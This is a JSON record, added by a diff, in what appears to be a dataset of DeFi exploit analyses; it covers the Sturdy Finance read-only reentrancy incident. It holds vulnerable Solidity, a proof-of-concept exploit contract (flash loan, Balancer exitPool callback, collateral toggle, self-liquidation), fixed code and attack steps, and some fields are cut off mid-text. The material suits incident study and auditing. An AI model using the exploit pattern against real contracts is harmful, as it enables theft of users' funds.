@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-06-12_SturdyFinance_ReadOnlyReentrancy_ETH",
+ "source_file": "2023/2023-06-12_SturdyFinance_ReadOnlyReentrancy_ETH.md",
+ "title": "Sturdy Finance — Read-Only Reentrancy Attack Analysis",
+ "date": "2023-06-12",
+ "protocol": "Sturdy Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$800,000 USD",
+ "loss_usd": 800000.0,
+ "root_cause": "Stale price used during Balancer B-stETH-STABLE pool ETH callback (read-only reentrancy)",
+ "attack_tx": "0xeb87...9eb7",
+ "vulnerable_contract": "0x9f72...b657 (Sturdy LendingPool)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: freely callable even during Balancer exitPool ETH callback\n// No nonReentrant guard → returns stale price\ncontract SturdyOracle {\n    function getAssetPrice(address asset) external view returns (uint256) {\n        // cB_stETH_STABLE address (0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746)\n        if (asset == cB_stETH_STABLE) {\n            // ❌ Directly reads current state of Balancer pool\n            // At the moment the ETH callback fires during exitPool(),\n            // Balancer's internal balances have not yet been updated → returns inflated value\n            IMetaStablePool pool = IMetaStablePool(B_STETH_STABLE_POOL);\n            uint256 rate = pool.getRate(); // ← inflated in stale state\n            uint256 ethPrice = getEthUsdPrice();\n            return rate * ethPrice / 1e18;\n        }\n        // ... handle other collateral\n    }\n}",
+  "// ❌ Vulnerable: callable during Balancer exitPool ETH callback\n// → allows collateral deactivation while collateral value is inflated\ncontract LendingPool {\n    function setUserUseReserveAsCollateral(\n        address asset,\n        bool useAsCollateral\n    ) external {\n        // ❌ No oracle reentrancy state check\n        // When this function is called within the callback window:\n        // - B-stETH-STABLE price = inflated (stale)\n        // - Disabling steCRV as collateral still passes healthFactor calculation (distorted)\n        DataTypes.ReserveData storage reserve = _reserves[asset];\n        ValidationLogic.validateSetUseReserveAsCollateral(\n            reserve,\n            asset,\n            useAsCollateral,\n            _reserves,\n            _usersConfig[msg.sender],\n            _reservesList,\n            _reservesCount,\n            _addressesProvider.getPriceOracle() // ← calls stale oracle\n        );\n        _usersConfig[msg.sender].setUsingAsCollateral(reserve.id, useAsCollateral);\n    }\n}",
+  "// [Step 1] Secure attack capital via Aave V3 flash loan\nfunction testExploit() public {\n    address[] memory assets = new address[](2);\n    assets[0] = address(wstETH);   // 50,000 wstETH\n    assets[1] = address(WETH);     // 60,000 WETH\n    uint256[] memory amounts = new uint256[](2);\n    amounts[0] = 50_000 * 1e18;\n    amounts[1] = 60_000 * 1e18;\n    // Execute flash loan → triggers executeOperation() callback\n    aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n}\n\n// [Step 2-3] Mint Curve steCRV + run Exploiter contract\nfunction executeOperation(...) external returns (bool) {\n    WETH.withdraw(1100 ether);\n    // 1,100 ETH → mint steCRV (Curve pool)\n    LidoCurvePool.add_liquidity{value: 1100 ether}(amount, 1000 ether);\n\n    // Deploy and run Exploiter contract (transfer all balances)\n    Exploiter exploiter = new Exploiter();\n    WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));\n    wstETH.transfer(address(exploiter), wstETH.balanceOf(address(this)));\n    steCRV.transfer(address(exploiter), steCRV.balanceOf(address(this)));\n    exploiter.yoink(); // core attack execution\n    // ...flash loan repayment handling\n}\n\n// [Core Attack Logic] Exploiter.yoink()\nfunction yoink() external {\n    joinBalancerPool();             // [Step 3] Mint Balancer LP\n    depositCollateralAndBorrow();   // [Step 4-5] Deposit Sturdy collateral + borrow\n    exitBalancerPool();             // [Step 6-7] exitPool + trigger read-only reentrancy\n    withdrawCollateralAndLiquidation(); // [Step 8-9] Withdraw collateral + self-liquidate\n    removeBalancerPoolLiquidity();  // [Step 10] Burn remaining LP\n    // Collect profit → transfer to owner\n}\n\n// [Step 6] Balancer exitPool → trigger receive() reentrancy window\nfunction exitBalancerPool() internal {\n    // Check Sturdy Oracle price before exitPool (normal value)\n    emit log_named_decimal_uint(\n        \"Before Read-Only-Reentrancy Collateral Price\",\n        SturdyOracle.getAssetPrice(cB_stETH_STABLE),\n        B_STETH_STABLE.decimals()\n    );\n    // Execute exitPool → ETH transfer → calls receive() (reentrancy window opens)\n    Balancer.exitPool(poolId, address(this), payable(address(this)), request);\n}\n\n// [Step 7] receive() callback — executed inside reentrancy window\nreceive() external payable {\n    nonce++;\n    if (nonce == 1) {\n        // ⚡ At this point: Balancer internal balances not yet updated → Oracle price inflated\n        emit log_named_decimal_uint(\n            \"In Read-Only-Reentrancy Collateral Price\",\n            SturdyOracle.getAssetPrice(cB_stETH_STABLE), // print inflated price\n            B_STETH_STABLE.decimals()\n        );\n        // ❌ Disable steCRV collateral while price is inflated\n        lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);\n    }\n}\n\n// [Step 8-9] Withdraw collateral + self-liquidation\nfunction withdrawCollateralAndLiquidation() internal {\n    // Check Oracle price after exitPool completes (confirm return to normal)\n    "
+ ],
+ "code_after": [
+  "// ✅ Fix: check Balancer pool reentrancy status first\ncontract SturdyOracle {\n    function getAssetPrice(address asset) external returns (uint256) {\n        if (asset == cB_stETH_STABLE) {\n            IMetaStablePool pool = IMetaStablePool(B_STETH_STABLE_POOL);\n\n            // ✅ Check whether Balancer pool is currently in a reentrancy state\n            // manageUserBalance() is a nonReentrant function on the Balancer Vault\n            // If called within a reentrancy window, it reverts → blocks stale price return\n            IBalancerVault(BALANCER_VAULT).manageUserBalance(\n                new IBalancerVault.UserBalanceOp[](0)\n            );\n\n            uint256 rate = pool.getRate();\n            uint256 ethPrice = getEthUsdPrice();\n            return rate * ethPrice / 1e18;\n        }\n    }\n}",
+  "// ✅ Fix: use Balancer Vault's nonReentrant function to detect reentrancy\n// Add inside SturdyOracle.getAssetPrice()\n\nimport {IBalancerVault} from \"./interfaces/IBalancerVault.sol\";\n\ncontract SturdyOracle {\n    IBalancerVault public constant BALANCER_VAULT =\n        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n\n    function getAssetPrice(address asset) external returns (uint256) {\n        if (isBalancerLP[asset]) {\n            // ✅ Call a nonReentrant function on the Balancer Vault\n            // If inside a reentrancy window (ETH callback), this reverts → blocks stale price return\n            // manageUserBalance has a nonReentrant modifier and\n            // automatically reverts in a reentrancy state\n            IBalancerVault.UserBalanceOp[] memory ops =\n                new IBalancerVault.UserBalanceOp[](0);\n            BALANCER_VAULT.manageUserBalance(ops); // ← reentrancy detection trigger\n\n            // Only reaches here if not in a reentrancy state\n            return _calculateBalancerLPPrice(asset);\n        }\n        // ... handle other collateral\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: Aave V3 Flash Loan",
+  "→ Borrow 50,000 wstETH + 60,000 WETH",
+  "Step 2: Mint Curve steCRV",
+  "→ Add 1,100 ETH to the steCRV pool",
+  "→ Receive ~1,023 steCRV",
+  "Step 3: Enter Balancer B-stETH-STABLE Pool",
+  "→ Deposit 50,000 wstETH + 57,000 WETH",
+  "→ Receive ~109,517 B-stETH-STABLE",
+  "Step 4: Deposit Collateral into Sturdy Finance",
+  "→ Deposit 1,000 steCRV + 233 B-stETH-STABLE",
+  "Step 5: Borrow from Sturdy Finance",
+  "→ Borrow 513 WETH",
+  "Step 6: Begin Withdrawing Liquidity from Balancer B-stETH-STABLE Pool",
+  "→ Call exitPool() → ETH callback fires (⚡ reentrancy window opens)",
+  "Step 7: [Inside Reentrancy Window] Disable steCRV Collateral",
+  "→ Call setUserUseReserveAsCollateral(steCRV, false)",
+  "→ healthFactor calculated using inflated B-stETH-STABLE price → passes",
+  "Step 8: [After Reentrancy Window Closes] Withdraw steCRV Collateral",
+  "→ withdrawCollateral(steCRV, 1000 steCRV)",
+  "Step 9: Self-Liquidation"
+ ],
+ "other_code": [
+  "Step 1: Aave V3 Flash Loan\n  → Borrow 50,000 wstETH + 60,000 WETH\n\nStep 2: Mint Curve steCRV\n  → Add 1,100 ETH to the steCRV pool\n  → Receive ~1,023 steCRV\n\nStep 3: Enter Balancer B-stETH-STABLE Pool\n  → Deposit 50,000 wstETH + 57,000 WETH\n  → Receive ~109,517 B-stETH-STABLE\n\nStep 4: Deposit Collateral into Sturdy Finance\n  → Deposit 1,000 steCRV + 233 B-stETH-STABLE\n\nStep 5: Borrow from Sturdy Finance\n  → Borrow 513 WETH\n\nStep 6: Begin Withdrawing Liquidity from Balancer B-stETH-STABLE Pool\n  → Call exitPool() → ETH callback fires (⚡ reentrancy window opens)\n\nStep 7: [Inside Reentrancy Window] Disable steCRV Collateral\n  → Call setUserUseReserveAsCollateral(steCRV, false)\n  → healthFactor calculated using inflated B-stETH-STABLE price → passes\n\nStep 8: [After Reentrancy Window Closes] Wit",
+  "Attacker EOA (0x1e84...a08b)\n      │\n      ▼\n┌─────────────────────────┐\n│   Aave V3 Flash Loan    │\n│  50,000 wstETH          │\n│  60,000 WETH            │\n└────────────┬────────────┘\n             │ callback: executeOperation()\n             ▼\n┌─────────────────────────┐\n│  Enter Curve steCRV Pool│\n│  1,100 ETH → 1,023 steCRV│\n└────────────┬────────────┘\n             │\n             ▼\n┌─────────────────────────┐\n│  Exploiter Contract     │◄── transfer all balances\n│  execute yoink()        │\n└──┬──────────────────────┘\n   │\n   ├─►┌─────────────────────────────┐\n   │  │ Balancer Pool Join          │\n   │  │ 50,000 wstETH + 57,000 WETH │\n   │  │ → 109,517 B-stETH-STABLE   │\n   │  └─────────────────────────────┘\n   │\n   ├─►┌─────────────────────────────┐\n   │  │ Deposit Collateral to Sturdy│\n "
+ ]
+}
